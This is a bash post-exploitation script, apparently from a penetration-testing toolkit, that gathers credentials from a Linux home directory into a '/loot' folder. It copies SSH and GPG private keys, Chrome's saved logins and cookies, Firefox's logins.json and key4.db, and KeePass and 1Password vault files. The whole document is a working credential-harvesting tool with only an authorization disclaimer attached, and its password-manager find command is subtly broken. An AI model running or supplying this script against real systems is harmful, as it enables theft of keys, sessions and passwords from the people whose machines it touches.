#!/bin/bash
# Credentials & Keys - SSH keys, browser DBs, password files
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] Credentials & Keys Collector"

DEST="/loot/credentials"
mkdir -p $DEST/{ssh,gpg,browser}

# SSH Keys
echo "[*] Collecting SSH keys..."
if [ -d ~/.ssh ]; then
    cp -r ~/.ssh $DEST/ssh/ 2>/dev/null
fi

# GPG Keys  
echo "[*] Collecting GPG keys..."
if [ -d ~/.gnupg ]; then
    cp -r ~/.gnupg $DEST/gpg/ 2>/dev/null
fi

# Chrome credentials
echo "[*] Collecting Chrome data..."
if [ -d "$HOME/.config/google-chrome/Default" ]; then
    cp "$HOME/.config/google-chrome/Default/Login Data" $DEST/browser/chrome_login.db 2>/dev/null
    cp "$HOME/.config/google-chrome/Default/Cookies" $DEST/browser/chrome_cookies.db 2>/dev/null
fi

# Firefox credentials
echo "[*] Collecting Firefox data..."
FF_PROFILE=$(find ~/.mozilla/firefox -name "*.default-release" 2>/dev/null | head -1)
if [ -n "$FF_PROFILE" ]; then
    cp "$FF_PROFILE/logins.json" $DEST/browser/firefox_logins.json 2>/dev/null
    cp "$FF_PROFILE/key4.db" $DEST/browser/firefox_key4.db 2>/dev/null
fi

# Password managers
echo "[*] Collecting password manager files..."
find ~ -name "*.kdbx" -o -name "*.1pif" -exec cp {} $DEST/ \; 2>/dev/null

echo "[+] Credentials collected to $DEST"
